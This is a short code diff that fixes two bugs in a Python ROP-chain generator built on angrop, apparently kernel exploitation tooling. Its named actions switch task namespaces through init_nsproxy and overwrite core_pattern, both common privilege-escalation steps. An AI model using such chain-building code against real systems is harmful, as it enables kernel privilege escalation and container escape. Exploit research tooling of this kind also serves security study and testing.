@@ -336,7 +336,7 @@ class RopGeneratorAngrop:
         ]
 
         items.extend(self._mov_reg_rax("rdi"))
-        items.append([
+        items.extend([
             RopChainOffset(self._find_pop_one_reg("rsi").addr),
             self._find_symbol(INIT_NSPROXY),
         ])
@@ -415,4 +415,4 @@ if __name__ == "__main__":
     action_switch_task_namespace = rop_generator.rop_action_switch_task_namespaces()
     print("Switch task Namepspace\n" + repr(action_switch_task_namespace) + '\n\n')
     action_core_pattern_overwrite = rop_generator.rop_action_core_pattern_overwrite(RopChainConstant(1234), RopChainConstant(5678))
-    print("Core Pattern Overwrite\n" + repr(action_switch_task_namespace) + '\n\n')
+    print("Core Pattern Overwrite\n" + repr(action_core_pattern_overwrite) + '\n\n')
